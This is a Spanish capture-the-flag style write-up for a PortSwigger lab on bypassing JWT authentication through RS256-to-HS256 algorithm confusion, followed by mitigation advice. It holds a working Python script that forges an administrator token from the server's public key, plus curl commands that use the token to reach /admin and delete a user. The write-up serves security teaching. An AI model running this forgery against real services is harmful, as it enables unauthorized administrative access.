@@ -1,0 +1,237 @@
+---
+title: "Bypass de Autenticación JWT mediante Confusión de Algoritmo"
+description: "Cómo explotar una vulnerabilidad de confusión de algoritmo JWT cambiando de RS256 a HS256 y usando la clave pública del servidor como secreto simétrico HMAC para forjar tokens de administrador."
+labUrl: "https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion"
+category: "JWT"
+date: "2025-03-13"
+portswiggerDescription: "Este lab utiliza un mecanismo basado en JWT para gestionar sesiones. Usa un par de claves RSA robusto para firmar y verificar tokens. Sin embargo, debido a fallos de implementación, este mecanismo es vulnerable a ataques de confusión de algoritmo. Para resolver el lab, primero obtén la clave pública del servidor. Esta se expone a través de un endpoint estándar. Usa esta clave para firmar un token de sesión modificado que te dé acceso al panel de administración en /admin, luego elimina al usuario carlos. Puedes iniciar sesión con tus propias credenciales: wiener:peter"
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="whats-jwt" title="Fundamentos de JWT" lang="es" />
+  <CollapsiblePartial partial="jwt-algorithm-confusion" title="Ataque de Confusión de Algoritmo JWT" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+El lab indica que el servidor expone su clave pública a través de un endpoint estándar. Vamos a obtenerla:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/jwks.json" | jq . | cat
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`jq .` = formatear JSON \
+`| cat` = redirigir la respuesta a mi <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">comando cat personalizado</a>
+
+Respuesta:
+
+```json
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "use": "sig",
+      "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+      "alg": "RS256",
+      "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
+    }
+  ]
+}
+```
+
+El servidor usa **RS256** (RSA-SHA256), un algoritmo asimétrico. La clave pública está completamente expuesta. Este es el ingrediente clave para el ataque de confusión de algoritmo.
+
+Ahora vamos a iniciar sesión para obtener un token JWT de sesión válido:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login" | grep -A 5 csrf
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`grep -A 5 csrf` = mostrar líneas que contienen "csrf" y 5 líneas después (para ver el formulario completo)
+
+```html
+<input required type="hidden" name="csrf" value="boKHZUigeTMwAPoj22PxRk44IWCeuNBL">
+<label>Username</label>
+<input required type=username name="username" autofocus>
+<label>Password</label>
+<input required type=password name="password">
+<button class=button type=submit> Log in </button>
+```
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=boKHZUigeTMwAPoj22PxRk44IWCeuNBL&username=wiener&password=peter"
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout \
+`-d "csrf=...&username=wiener&password=peter"` = enviar datos POST (automáticamente establece el método a POST y Content-Type a application/x-www-form-urlencoded)
+
+Respuesta:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0.mY9e1sSEUFUkVXwt1RZhNaVTZz_d8iID7VKXSA84VCB1ZeMXKv-vq6D3oD52RMSsK_u65ZAnm0jioylxe6SB1k-VrmT3zCK_ECOXENtHLRsHqOA8lGs_cbLRfACBuOXdsrrEFqTYyGLbcTdEYAxkPOQAeCJvzdH6wloScHTPKcR1AY9UgFscFvAHixB5idR6_fe7MgnZP7-IyN28--CybyxcwMKFAL1FfE9u81fNkx-Qa3bGJZGqRXuYreIzpBbk95ijPADOIual0MpJspyJ5996IoNr4gHy34EmsOqH6xJFvLLrWlvHNyLupnwLHmvGIX-Jrg3Iw3PI9IwdhWngOQ; Secure; HttpOnly; SameSite=None
+```
+
+Decodifiquemos el JWT para entender su estructura:
+
+```bash
+echo "eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9" | base64 -d | jq . | cat
+```
+
+Salida del header:
+
+```json
+{
+  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+  "alg": "RS256"
+}
+```
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Salida del payload:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1773429937,
+  "sub": "wiener"
+}
+```
+
+El JWT usa **RS256** y el servidor expone su clave pública en `/jwks.json`. Esta es una configuración de libro de texto para un **ataque de confusión de algoritmo**: cambiamos `alg` a HS256 y firmamos el token usando la clave pública RSA (en formato PEM) como el secreto simétrico HMAC. El servidor verificará usando su "clave pública" como si fuera un secreto HMAC, y nuestra firma coincidirá.
+
+El ataque requiere convertir primero el JWK a formato PEM X.509 (la pista del lab confirma que el servidor almacena su clave como PEM). Escribamos un script de Python que realice el exploit completo:
+
+```python
+import base64, hmac, hashlib
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+# JWK from /jwks.json
+jwk = {
+  "kty": "RSA",
+  "e": "AQAB",
+  "use": "sig",
+  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
+  "alg": "RS256",
+  "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
+}
+
+def b64url_decode(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
+def b64url_encode(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
+
+# Convert JWK to RSA public key
+modulus = int.from_bytes(b64url_decode(jwk['n']), 'big')
+exponent = int.from_bytes(b64url_decode(jwk['e']), 'big')
+
+public_key = rsa.RSAPublicNumbers(exponent, modulus).public_key()
+
+# Get PEM format
+pem = public_key.public_bytes(
+  encoding=serialization.Encoding.PEM,
+  format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+print("Extracted PEM public key:")
+print(pem.decode())
+
+# Forge JWT with alg=HS256
+header = '{"kid":"66a4de73-4f3b-4bc3-af9e-913726ff79e9","alg":"HS256"}'
+# Also set sub=administrator
+payload = '{"iss":"portswigger","exp":1773429937,"sub":"administrator"}'
+
+message = f"{b64url_encode(header.encode())}.{b64url_encode(payload.encode())}"
+
+# Sign with HMAC-SHA256 using the PEM public key as the secret
+signature = b64url_encode(hmac.new(pem, message.encode(), hashlib.sha256).digest())
+
+forged_jwt = f"{message}.{signature}"
+
+print("\nForged JWT:")
+print(forged_jwt)
+```
+
+> **Desglose del script**: \
+> El script realiza un ataque de confusión de algoritmo JWT:
+> 1. **Convierte** la clave pública JWK de `/jwks.json` a formato PEM X.509 usando codificación DER manual (la pista del lab indica que el servidor almacena su clave como PEM)
+> 2. **Crea un nuevo header** con `"alg": "HS256"` en lugar de `RS256`, engañando al servidor para que use verificación HMAC
+> 3. **Crea un nuevo payload** con `"sub": "administrator"` para suplantar al administrador
+> 4. **Firma con HMAC-SHA256** usando la **clave pública PEM como secreto simétrico** — la misma clave que el servidor usará para verificar cuando vea `alg: HS256`
+
+Salida esperada:
+
+```
+Extracted PEM public key:
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsj2oHajSBloFiMQ4ibb4
+AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO+3J
+kQOMwgazq+j/8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt/y+NqZZOHFBEPfdRBrcOWq
+a8iiSHi+Any6XC/CRgThyRMLumedBZx8Ql0qX0O0/3ONvapVfv5d1NZIz4Ub1tKr
+d6ZfctGL3MDfy6MVnqfjUd0A/1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiE
+n2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e/xfAd7utO1qBh+q/F0u0wcakpIP
+eQIDAQAB
+-----END PUBLIC KEY-----
+
+Forged JWT:
+eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E
+```
+
+Ahora accedamos al panel de administración con nuestro JWT forjado:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E" \
+  | grep "carlos"
+```
+
+> **Desglose del comando**: \
+`-b "session=..."` = enviar el JWT forjado como cookie de sesión \
+`grep "carlos"` = mostrar líneas que contienen "carlos"
+
+Respuesta:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+Tenemos acceso de administrador. Ahora eliminemos al usuario carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E"
+```
+
+El ataque de confusión de algoritmo nos permitió **usar la propia clave pública del servidor en su contra**, convirtiendo su mecanismo de verificación en nuestra herramienta de firma y fulminando a carlos con la misma clave que debía protegerlo.
+
+## Estrategias de Mitigación
+
+1. **Forzar el algoritmo esperado del lado del servidor**: Nunca confíes en el header `alg` del JWT. El servidor debe tener un algoritmo esperado configurado o codificado y rechazar tokens que no coincidan
+2. **Usar lógica de verificación separada por algoritmo**: No pases claves asimétricas a funciones de verificación simétricas. Las claves públicas RSA solo deben usarse con algoritmos RSA, nunca como secretos HMAC
+3. **Usar una whitelist de algoritmos permitidos**: Define explícitamente qué algoritmos acepta el servidor y rechaza todos los demás durante la verificación
+4. **Mantener las claves públicas separadas de los secretos HMAC**: Almacena y recupera claves públicas RSA y secretos HMAC a través de rutas de código diferentes para prevenir confusión
+5. **Usar librerías JWT bien mantenidas**: Las librerías modernas activamente mantenidas típicamente incluyen protecciones integradas contra confusión de algoritmo cuando están correctamente configuradas y actualizadas
+
+## Referencias
+
+**JWK Set\*** (JSON Web Key Set) es una estructura JSON definida en [RFC 7517](https://datatracker.ietf.org/doc/html/rfc7517) que representa un conjunto de claves criptográficas. Los servidores comúnmente exponen sus claves públicas en `/.well-known/jwks.json` o `/jwks.json`.
+
+## Recursos
+
+[JWT.io Debugger](https://jwt.io/) Esta es una herramienta interactiva para decodificar, verificar y depurar tokens JWT. También me fue útil cuando era desarrollador web.
